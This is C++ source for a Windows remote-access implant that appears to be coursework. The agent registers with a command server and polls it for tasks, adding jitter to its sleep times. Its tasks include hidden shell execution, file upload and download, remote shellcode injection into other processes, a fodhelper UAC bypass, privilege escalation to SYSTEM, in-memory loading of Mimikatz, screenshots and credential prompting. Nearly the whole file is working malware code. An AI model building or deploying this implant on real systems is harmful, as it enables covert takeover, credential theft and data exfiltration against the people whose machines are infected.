#define no_init_all
#pragma comment(lib, "wininet.lib")
#pragma warning(disable : 4996)
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <sstream>
#include <WinInet.h>
#include <string>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

#include "config.h"
#include "json.hpp"
#include "base64.h"
#include "os_info.h"
#include "readFile.h"
#include "writefile.h"
#include "process_injection.h"
#include "srdi_loader.h"

using namespace std;
using json = nlohmann::json;
std::string global_agent_id = "NA";

//The following depends on the above json and/or global agent id code.
#include "server_comms.h"
#include "downloadfile.h"
#include "uploadfile.h"

////////////////////////
// Enums
////////////////////////

enum TaskCode {
    Task_Exit = 1,
    Task_Shell,
    Task_Cwd,
    Task_ChangeDir,
    Task_Whoami,
    Task_PsList,
    Task_DownloadFile,
    Task_UploadFile,
    Task_ListPrivs,
    Task_SetPriv,
    Task_RemoteInject,
    Task_BypassUAC,
    Task_GetSystem,
    Task_Screenshot,
    Task_Sleep,
    Task_Mimikatz,
    Task_Copy,
    Task_Move,
    Task_Delete,
    Task_CreateKey,
    Task_WriteValue,
    Task_DeleteKey,
    Task_DeleteValue,
    Task_QueryKey,
    Task_QueryValue,
    Task_CreateScheduledTask,
    Task_StartScheduledTask,
    Task_Netstat,
    Task_Ipconfig,
    Task_Messagebox,
    Task_Dir,
    Task_PromptCredentials
};

enum ReturnCode {
    Task_Success = 4,
    Task_Failure,
    Task_NotImplemented
};


////////////////////////
// Functions
////////////////////////

void StripPadding(std::string* in) { //Note: not actually used by anything at the moment (10/12/2025)
    while (!in->empty() && *(in->rbegin()) == '=') in->resize(in->size() - 1);
}

int execute_task(int type, std::string input, std::string file_id, std::string task_id, std::string *out)
{
    // a few vars used in multiple cases
    BOOL bRet;
    DWORD result;

    COUT("executing task");

    switch (type)
    {
        case TaskCode::Task_Exit:
        {
            *out = "";
            COUT("execute_task Task_Exit: Recieved Quit Command" << GetLastError());
            exit(0);
        }

        case TaskCode::Task_Shell:
        {
            HANDLE hRead, hWrite;
            SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };

            if (!CreatePipe(&hRead, &hWrite, &sa, 0))
                return ReturnCode::Task_Failure;

            if (!SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0))
                return ReturnCode::Task_Failure;

            STARTUPINFOW si{};
            si.cb = sizeof(si);
            si.hStdOutput = hWrite;
            si.hStdError = hWrite;
            si.dwFlags |= STARTF_USESTDHANDLES;

            int size_needed = MultiByteToWideChar(CP_UTF8, 0, &input[0], (int)input.size(), NULL, 0);
            std::wstring winput;
            winput.resize(size_needed);
            MultiByteToWideChar(CP_UTF8, 0, &input[0], (int)input.size(), &winput[0], size_needed);
            std::wstring fullCmd = L"cmd.exe /C " + winput;
            std::vector<wchar_t> cmdBuf;
            cmdBuf.assign(fullCmd.begin(), fullCmd.end());
            cmdBuf.push_back(L'\0');

            PROCESS_INFORMATION pi{};
            bRet = CreateProcessW(
                NULL,
                cmdBuf.data(),
                NULL,
                NULL,
                TRUE,
                CREATE_NO_WINDOW,
                NULL,
                NULL,
                &si,
                &pi
            );

            CloseHandle(hWrite);

            if (!bRet)
                return ReturnCode::Task_Failure;

            DWORD res = WaitForSingleObject(pi.hProcess, 10000);
            if (res == WAIT_TIMEOUT)
            {
                TerminateProcess(pi.hProcess, 1);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                CloseHandle(hRead);
                return ReturnCode::Task_Failure;
            }

            DWORD bytesRead;
            *out = "";
            char buf[4096];
            while (ReadFile(hRead, buf, sizeof(buf) - 1, &bytesRead, NULL) && bytesRead > 0)
            {
                buf[bytesRead] = '\0';
                *out += buf;
            }

            CloseHandle(hRead);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);

            return ReturnCode::Task_Success;
        }

        case TaskCode::Task_Cwd: //Must use Windows API functions
        {
            COUT("Task_Cwd specified");

            bRet = getCwd(out);
            if (!bRet)
            {
                //debug print is handled in getCwd().
                return ReturnCode::Task_Failure;
            }

            return ReturnCode::Task_Success;
        }

        case TaskCode::Task_ChangeDir: //Must use Windows API functions
        {
            std::string parse = input;
            size_t pos = 0;
            *out = ""; // No output in any case

            // Escape quotes and pass into cd command
            while ((pos = parse.find('"', pos)) != std::string::npos)
            {
                parse.replace(pos, 1, "\\\"");
                pos += 2;
            }

            result = SetCurrentDirectory(parse.c_str());

            if (!result) // Simplistic error handling using return code
            {
                COUT("execute_task Task_ChangeDir: generic failure - " << GetLastError());
                return ReturnCode::Task_Failure;
            }

            return ReturnCode::Task_Success;
        }

        case TaskCode::Task_Dir:
        {
            COUT("Task_Dir specified");

            std::string cwd;
            bRet = getCwd(&cwd);
            if (!bRet)
            {
                //debug print is handled in getCwd()
                return ReturnCode::Task_Failure;
            }

            bRet = getDirContents(cwd, out);
            if (!bRet)
            {
                return ReturnCode::Task_Failure;
            }

            return ReturnCode::Task_Success;
        }

        case TaskCode::Task_Whoami:
        {
            std::array<char, MAX_PATH> buffer;
            std::string cmd = "whoami";
            FILE* command_output = _popen(cmd.c_str(), "r");

            if (!command_output)
            {
                *out = "";
                COUT("execute_task Task_Whoami: generic failure - " << GetLastError());
                return ReturnCode::Task_Failure;
            }

            while (fgets(buffer.data(), static_cast<int>(buffer.size()), command_output) != NULL)
            {
                *out += buffer.data();
            }

            _pclose(command_output);
            return ReturnCode::Task_Success;
        }

        case TaskCode::Task_PsList:
        {
            // Create table header
            std::ostringstream stream;
            stream << std::left << std::setw(8) << "PID" << std::setw(30) << "Process Name\n";
            stream << std::setfill('-') << std::setw(30) << "-\n";
            stream << std::setfill(' ');

            // Snapshot processes
            HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

            if (snapshot == INVALID_HANDLE_VALUE)
            {
                COUT("execute_task Task_PsList failure: " << GetLastError());
                return ReturnCode::Task_Failure;
            }

            PROCESSENTRY32 entry;
            entry.dwSize = sizeof(PROCESSENTRY32);

            // Format processes into table
            if (Process32First(snapshot, &entry))
            {
                do
                {
                    stream << std::left << std::setw(8) << entry.th32ProcessID << std::setw(30) << entry.szExeFile << "\n";
                } while (Process32Next(snapshot, &entry));
            }
            else
            {
                COUT("execute_task Task_PsList failure: " << GetLastError());
                return ReturnCode::Task_Failure;
            }

            CloseHandle(snapshot);
            *out = stream.str();
            return ReturnCode::Task_Success;
        }

        case TaskCode::Task_DownloadFile:
        {
            // Download a given file from the server to the local machine
            // No spec appears to be given for specifying the output. As such, it will download to the current working directory
            COUT("downloadFile specified");

            // Download file data from server
            std::string encoded;
            bRet = downloadFile(file_id, task_id, &encoded); // first thing it downloads is encoded and it has the shellcode in the encoded
            if (!bRet)
            {
                COUT("execute_task Task_DownloadFile failure: downloadFile failed with error " << GetLastError()); //Error is printed downstream
                return ReturnCode::Task_Failure;
            }
            COUT("execute_task Task_DownloadFile: downloaded content from server - " << encoded);

            bRet = WriteWholeFile(input, encoded);
            if (!bRet)
            {
                COUT("execute_task Task_DownloadFile failure: WriteWholeFile failed with error " << GetLastError()); //Error is printed downstream
                return ReturnCode::Task_Failure;
            }

            return ReturnCode::Task_Success;
        }

        case TaskCode::Task_UploadFile:
        {
            COUT("uploadFile specified");

            // Read file from disk
            std::string file_data;
            bRet = ReadWholeFile(input, &file_data);
            if (!bRet)
            {
                COUT("execute_task Task_UploadFile failure: ReadWholeFile failed with error " << GetLastError());
                return ReturnCode::Task_Failure;
            }

            // Send file to server in chunks
            bRet = uploadFile(&task_id, file_data, &file_id, input);
            if (!bRet)
            {
                COUT("execute_task Task_UploadFile failure: uploadFile failed with error " << GetLastError());
                return ReturnCode::Task_Failure;
            }

            COUT("execute_task Task_UploadFile: successfully uploaded file with file_id=" << file_id);
            return ReturnCode::Task_Success;
        }

        case TaskCode::Task_BypassUAC:
        {
            COUT("Task_BypassUAC specificed");

            // Parse input to find what bypass option to use
            string::size_type pos;
            pos = input.find(' ', 0);
            int bypassType = std::stoi(input.substr(0, pos)); // This might need some additional error handling if input is bad or does not have an element here that can be parsed to string
            std::string args = input.substr(pos + 1);

            // Determine bypass type
            switch (bypassType)
            {
                case 1: //fodhelper method
                {
                    std::string encoded;
                    bRet = downloadFile(file_id, task_id, &encoded); // first thing it downloads is encoded and it has the shellcode in the encoded
                    if (!bRet)
                    {
                        COUT("execute_task Task_BypassUAC failure: downloadFile failed with error " << GetLastError()); //Error is printed downstream
                        return ReturnCode::Task_Failure;
                    }

                    COUT("MADE IT PAST THE DOWNLOADFILE");

                    /////////////////////
                    // Cast b64 decoded shellcode to BYTE* or PVOID
                    /////////////////////
                    std::vector<uint8_t> shellcode(encoded.begin(), encoded.end());
                    BYTE* payload = shellcode.data();
                    SIZE_T payload_len = shellcode.size();

                    COUT("payload: " << payload);
                    COUT("payload_len: " << payload_len);

                    // at this point this whole payload should be the entirety of the shellcode (converted DLL)
                    // from the server
                    // lets execute it now since we cant do writing to disk
                    std::wstring dll_arguments = toWstring(args);

                    int execution_result = executeShellcodeInMemory(payload, payload_len, dll_arguments, out);
                    if (execution_result != 0)
                    {
                        COUT("executeShellcodeInMemory failed for Task_BypassUAC");
                        return ReturnCode::Task_Failure;
                    }

                    COUT("Task_BypassUAC executed successfully");
                    return ReturnCode::Task_Success;
                }
                default: // Unrecognized bypass type
                {
                    COUT("Task_BypassUAC: unsupported bypass method specified: " << bypassType);
                    return ReturnCode::Task_NotImplemented;
                }
            }           
        }

        case TaskCode::Task_GetSystem:
        {
            COUT("Task_GetSystem specificed");

            // Parse input to find what bypass option to use
            string::size_type pos;
            pos = input.find(' ', 0);
            int escalateType = std::stoi(input.substr(0, pos)); // This might need some additional error handling if input is bad or does not have an element here that can be parsed to string
            std::string args = input.substr(pos + 1);

            // Determine bypass type
            switch (escalateType)
            {
                case 1: //pipe method
                {
                    std::string encoded;
                    bRet = downloadFile(file_id, task_id, &encoded); // first thing it downloads is encoded and it has the shellcode in the encoded
                    if (!bRet)
                    {
                        COUT("execute_task Task_GetSystem failure: downloadFile failed with error " << GetLastError()); //Error is printed downstream
                        return ReturnCode::Task_Failure;
                    }

                    COUT("MADE IT PAST THE DOWNLOADFILE");

                    /////////////////////
                    // Cast b64 decoded shellcode to BYTE* or PVOID
                    /////////////////////
                    std::vector<uint8_t> shellcode(encoded.begin(), encoded.end());
                    BYTE* payload = shellcode.data();
                    SIZE_T payload_len = shellcode.size();

                    COUT("payload: " << payload);
                    COUT("payload_len: " << payload_len);

                    // at this point this whole payload should be the entirety of the shellcode (converted DLL)
                    // from the server
                    // lets execute it now since we cant do writing to disk
                    std::wstring dll_arguments = toWstring(args);

                    int execution_result = executeShellcodeInMemory(payload, payload_len, dll_arguments, out);
                    if (execution_result != 0)
                    {
                        COUT("executeShellcodeInMemory failed for Task_GetSystem");
                        return ReturnCode::Task_Failure;
                    }

                    COUT("Task_GetSystem executed successfully");
                    return ReturnCode::Task_Success;
                }
                default: // Unrecognized escalation type
                {
                    COUT("Task_GetSystem: unsupported escalation method specified: " << escalateType);
                    return ReturnCode::Task_NotImplemented;
                }
            }
        }

        case TaskCode::Task_Screenshot:
        {
            COUT("Task_Screenshot specificed");
           
            std::string encoded;
            bRet = downloadFile(file_id, task_id, &encoded); // first thing it downloads is encoded and it has the shellcode in the encoded
            if (!bRet)
            {
                COUT("execute_task Task_Screenshot failure: downloadFile failed with error " << GetLastError()); //Error is printed downstream
                return ReturnCode::Task_Failure;
            }

            COUT("MADE IT PAST THE DOWNLOADFILE");

            /////////////////////
            // Cast b64 decoded shellcode to BYTE* or PVOID
            /////////////////////
            std::vector<uint8_t> shellcode(encoded.begin(), encoded.end());
            BYTE* payload = shellcode.data();
            SIZE_T payload_len = shellcode.size();

            COUT("payload: " << payload);
            COUT("payload_len: " << payload_len);

            // at this point this whole payload should be the entirety of the shellcode (converted DLL)
            // from the server
            // lets execute it now since we cant do writing to disk

            int execution_result = executeShellcodeInMemory(payload, payload_len, L"", out);
            if (execution_result != 0)
            {
                COUT("executeShellcodeInMemory failed for Task_Screenshot");
                return ReturnCode::Task_Failure;
            }

            // just gonna borrow uploadFile here, with no file input
            // server has the task id so it knows its a screenshot
            bRet = uploadFile(&task_id, *out, &file_id, "");
            if (!bRet)
            {
                COUT("execute_task Task_Screenshot failure: uploadFile failed with error " << GetLastError());
                return ReturnCode::Task_Failure;
            }

            COUT("Task_Screenshot executed successfully");
            return ReturnCode::Task_Success;

        }

        case TaskCode::Task_Sleep:
        {
            COUT("Task_Sleep specificed");

            // Parse options
            std::istringstream iss(input);
            std::string cmd, newSecondsStr, newJitterMaxStr, newJitterMinStr;
            iss >> cmd >> newSecondsStr >> newJitterMaxStr >> newJitterMinStr;

            int newSeconds = std::atoi(newSecondsStr.c_str());
            int newJitterMax = std::atoi(newJitterMaxStr.c_str());
            int newJitterMin = 25; //Default to 25% if not set
            if (newJitterMinStr != "")
            {
                newJitterMin = std::atoi(newJitterMinStr.c_str());
            }

            if (newJitterMax < newJitterMin)
            {
                // if jitter max is above jitter min, set min to 0
                newJitterMin = 0;
            }

            // apply new options
            SLEEPTIME = newSeconds;
            JITTER_MAX = newJitterMax;
            JITTER_MIN = newJitterMin;

            return ReturnCode::Task_Success;
        }

        case TaskCode::Task_RemoteInject:
        {
            // Perform shellcode injection
            // We can assume the architecture of the PID and the shellcode match and that the current user is the owner of the PID
            COUT("remoteinject specified");
            /////////////////////
            // Server will send the target PID (as the input string) and the file_id
            /////////////////////
            int pid = atoi(input.c_str()); // We know for sure this is a int so no need for error checking. If it isn't an int, then we have bigger problems.
            /////////////////////
            // Retrieve shellcode from server using Download task and transfer method. Keep shellcode in RAM
            // Single chunk for now
            /////////////////////
            std::string encoded;
            bRet = downloadFile(file_id, task_id, &encoded); // first thing it downloads is encoded and it has the shellcode in the encoded
            if (!bRet)
            {
                COUT("execute_task Task_RemoteInject failure: downloadFile failed with error " << GetLastError()); //Error is printed downstream
                return ReturnCode::Task_Failure;
            }

            std::string decodedText;
            if (!Base64Decode(encoded, &decodedText)) {
                COUT("Base64Decode error in download: " << GetLastError());
                return ReturnCode::Task_Failure;
            }

            COUT("decodedText: " << decodedText);

            /////////////////////
            // Cast b64 decoded shellcode to BYTE* or PVOID
            /////////////////////
            std::vector<uint8_t> shellcode(decodedText.begin(), decodedText.end());
            BYTE* payload = shellcode.data();
            SIZE_T payload_len = shellcode.size();

            COUT("payload: " << payload);
            COUT("payload_len: " << payload_len);

            /////////////////////
            // Perform injection. Note: we are specifically using RemoteInjection and thus not using the generic inject_process() func
            /////////////////////
            HANDLE hProc = OpenProcess(
                PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                FALSE, (DWORD)pid
            );
            COUT("made it here");
            if (hProc == NULL)
            {
                COUT("execute_task Task_RemoteInject failure: OpenProcess failed with error " << GetLastError());
                return ReturnCode::Task_Failure;
            }

            // Mild TODO: we are currently using an albatross of 4 different injection/inject helper functions copied from the lab
            // As of now, we only *need* this one to achieve HW05
            // We can either overachieve and use inject_process(), keep things as they are, or delete the excess functions
            if (Inject_CreateRemoteThread(hProc, payload, payload_len) != 0)
            {
                COUT("inject failed");
                CloseHandle(hProc);
                return ReturnCode::Task_Failure;
            }

            /////////////////////
            // The wait for 500ms and most cleanup cleanup is handled in the injection function above. Let's finish it up:
            /////////////////////
            CloseHandle(hProc);

            /////////////////////
            // Output is always an empty string
            /////////////////////
            *out = "";
            return ReturnCode::Task_Success;
        }

        case TaskCode::Task_Mimikatz:
        {
            // Generic function used for all sRDI modules that do not require special handling
            COUT("Handling Mimikatz");

            /////////////////////
            // Retrieve shellcode from server using Download task and transfer method. Keep shellcode in RAM
            // Single chunk for now as all current sRDI modules are small
            /////////////////////
            std::string encoded;
            COUT("FILE ID: " << file_id << "\nTASK ID: " << task_id);
            bRet = downloadFile(file_id, task_id, &encoded); // first thing it downloads is encoded and it has the shellcode in the encoded
            if (!bRet)
            {
                COUT("execute_task Mimikatz failure: downloadFile failed with error " << GetLastError()); //Error is printed downstream
                return ReturnCode::Task_Failure;
            }

            /////////////////////
            // Cast b64 decoded shellcode to BYTE* or PVOID
            /////////////////////
            std::vector<uint8_t> shellcode(encoded.begin(), encoded.end());
            BYTE* payload = shellcode.data();
            SIZE_T payload_len = shellcode.size();

            COUT("execute_task Mimikatz - payload inside Task_QueryValue: " << payload);
            COUT("execute_task Mimikatz - payload_len inside Task_QueryValue: " << payload_len);

            std::wstring dll_arguments = toWstring(input);

            int execution_result = executeShellcodeInMemoryMimikatz(payload, payload_len, dll_arguments, out);
            if (execution_result != 0)
            {
                COUT("execute_task Mimikatz - executeShellcodeInMemory failed for Task_QueryValue");
                return ReturnCode::Task_Failure;
            }

            COUT("execute_task Mimikatz - executed successfully for TaskCode" << type);

            return ReturnCode::Task_Success;
        }

        case TaskCode::Task_Copy:
        case TaskCode::Task_ListPrivs:
        case TaskCode::Task_SetPriv:
        case TaskCode::Task_Move:
        case TaskCode::Task_Delete:
        case TaskCode::Task_CreateKey:
        case TaskCode::Task_WriteValue:
        case TaskCode::Task_DeleteKey:
        case TaskCode::Task_DeleteValue:
        case TaskCode::Task_QueryKey:
        case TaskCode::Task_QueryValue:
        case TaskCode::Task_CreateScheduledTask:
        case TaskCode::Task_StartScheduledTask:
        case TaskCode::Task_Netstat:
        case TaskCode::Task_Ipconfig:
        case TaskCode::Task_Messagebox:
        case TaskCode::Task_PromptCredentials:            
        {
            // Generic function used for all sRDI modules that do not require special handling
            COUT("Handling generic sRDI task - TaskCode: " << type);

            /////////////////////
            // Retrieve shellcode from server using Download task and transfer method. Keep shellcode in RAM
            // Single chunk for now as all current sRDI modules are small
            /////////////////////
            std::string encoded;
            COUT("FILE ID: " << file_id << "\nTASK ID: " << task_id);
            bRet = downloadFile(file_id, task_id, &encoded); // first thing it downloads is encoded and it has the shellcode in the encoded
            if (!bRet)
            {
                COUT("execute_task genericSRDI failure: downloadFile failed with error " << GetLastError()); //Error is printed downstream
                return ReturnCode::Task_Failure;
            }

            /////////////////////
            // Cast b64 decoded shellcode to BYTE* or PVOID
            /////////////////////
            std::vector<uint8_t> shellcode(encoded.begin(), encoded.end());
            BYTE* payload = shellcode.data();
            SIZE_T payload_len = shellcode.size();

            COUT("execute_task genericSRDI - payload inside Task_QueryValue: " << payload);
            COUT("execute_task genericSRDI - payload_len inside Task_QueryValue: " << payload_len);

            std::wstring dll_arguments = toWstring(input);

            int execution_result = executeShellcodeInMemory(payload, payload_len, dll_arguments, out);
            if (execution_result != 0)
            {
                COUT("execute_task genericSRDI - executeShellcodeInMemory failed for Task_QueryValue");
                return ReturnCode::Task_Failure;
            }

            COUT("execute_task genericSRDI - executed successfully for TaskCode" << type);

            return ReturnCode::Task_Success;
        }

        default:
        {
            COUT("execute_task: unrecognized task code " << type);
            return ReturnCode::Task_NotImplemented;
        }

    }

    //Shouldn't ever reach this
    COUT("executed_task reached final return statement (this should not happen)");
    return true;
}

// Function to add jitter to sleep time
int addJitter(int sleepTime, int jitterMax, int jitterMin)
{
    // simple early out if jitterMax is 0
    if (jitterMax == 0)
    {
        return sleepTime;
    }

    // find a random percentage (as integer) between jitter min and jitter max
    // this is a different method than used on the lab but is much better when given a min value
    // to get a random value less than x, do rand() % x
    int randomJitterPercent = rand() % (jitterMax - jitterMin + 1) + jitterMin;

    // apply random percentage to sleep time
    int randomJitterSeconds = (sleepTime * randomJitterPercent) / 100;
    return sleepTime + randomJitterSeconds;
}

////////////////////////
// Main
////////////////////////

int programMain()
{
    // Seed the random number generator
    srand((unsigned int)time(NULL));

    //Register agent
    std::string registerStr = "";
    registrationJson(&registerStr);
    std::string response = convert_and_send(registerStr, 1);

    json registration_response = json::parse(response); 

    if (!registration_response.contains("data"))
    {
        COUT("Failed to register agent\n");
        return 1;
    }

    std::string inner_decoded;
    Base64Decode(registration_response["data"], &inner_decoded);

    // Parse the decoded text as JSON
    json inner_json = json::parse(inner_decoded);


    if (inner_json.contains("agent_id"))
    {
        global_agent_id = inner_json["agent_id"];
        COUT("Registered agent successfully");
        COUT("Agent ID: " << global_agent_id);
    }
    else
    {
        COUT("Registration succeeded but no agent_id field");
    }

    while (true)
    {
        // Send poll to Server for next task
        std::string nextTaskJson = "";
        getNextTaskJson(&nextTaskJson);

        response = convert_and_send(nextTaskJson, 2);
        json task_response = json::parse(response);

        // Parse server response for task
        if (task_response.contains("data"))
        {
            Base64Decode(task_response["data"], &response);
            task_response = json::parse(response);
        }

        // If no task is queued, keep polling
        if (task_response.contains("type"))
        {
            // Extract next task metadata
            int task_type = task_response["type"];
            std::string task_id = task_response["id"];
            std::string input = task_response["input"];
            std::string result = "";
            std::string file_id;
            if (task_response.contains("file_id")) // Handle download/shellcode tasks
            {
                file_id = task_response["file_id"];
                COUT("file_id: " << file_id);
            }
            int status = 0;

            // Execute the request task
            status = execute_task(task_type, input, file_id, task_id, &result);

            // Parse the server response of the task execution
            std::string taskResultJson = "";
            sendTaskResponseJson(task_id, result, status, &taskResultJson);
            COUT("TASK RESULT: " << taskResultJson);

            response = convert_and_send(taskResultJson, 3);
            task_response = json::parse(response);

            // Check whether the executed task was okay or caused a server error
            Base64Decode(task_response["message"], &response);
            task_response = json::parse(response);
            COUT("RESPONSE: " << response);

            // Note that the client will terminate within the execute_task function
        }

        int iterSleepTime = addJitter(SLEEPTIME, JITTER_MAX, JITTER_MIN);
        PRINTF("sleeping for seconds: %d",iterSleepTime);
        Sleep(iterSleepTime * 1000);
    }

    return 0;
}

// Console visibility
#ifdef _DEBUG
// DEBUG BUILD
int main()
{
    // console
    return programMain();
}
#else 
// RELEASE BUILD
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
    // no console
    return programMain();
}
#endif